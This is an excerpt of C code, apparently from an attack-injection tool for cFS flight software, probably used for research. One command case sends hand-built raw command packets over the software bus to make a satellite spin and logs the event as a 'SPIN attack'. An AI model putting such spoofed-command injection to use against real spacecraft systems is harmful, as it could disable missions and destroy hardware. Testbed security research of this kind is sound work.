    ...
    switch (CommandCode)
    {
        ...
        */
        case CAM_EXP3_CC:
            ...
            //SPIN SATELLITE - TAGGED with 
            uint8_t buffer[] = {0x19,0x40,0xc0,0x00,0x00,0x06,0x02,0x24,0x00,0x30,0x30,0x30,0x30};
            uint8_t buffer2[] = {0x19,0x92,0xc0,0x00,0x00,0x04,0x03,0x24,0x00,0x0a,0x00};
            uint8_t buffer3[] = {0x19,0x92,0xC0,0x00,0x00,0x04,0x03,0x24,0x01,0x0a,0x00};
            uint8_t buffer4[] = {0x19,0x92,0xC0,0x00,0x00,0x04,0x03,0x24,0x02,0x0a,0x00};
            ...
            sleep(0.5); //DOES NOT SLEEP 0.5 BUT RATHER 0.1-0.2 - sleep <1 seems to work weird but will be enough for now
            CFE_SB_TransmitMsg((CFE_MSG_Message_t *) buffer2, true);
            sleep(0.5); //DOES NOT SLEEP 0.5 BUT RATHER 0.1-0.2 - sleep <1 seems to work weird but will be enough for now
            CFE_SB_TransmitMsg((CFE_MSG_Message_t *) buffer3, true);
            sleep(0.5); //DOES NOT SLEEP 0.5 BUT RATHER 0.1-0.2 - sleep <1 seems to work weird but will be enough for now
            CFE_SB_TransmitMsg((CFE_MSG_Message_t *) buffer4, true);
            
            printf("Sent commands to make the satellite spin\n");
            //fprintf(attack_log, "SPIN attack at : %lld \n", localtime.ticks);
            fprintf(attack_log, "SPIN attack at : %d.%06ld\n", packet_seconds, realtime.tv_nsec/1000);
            fflush(attack_log);
            break;
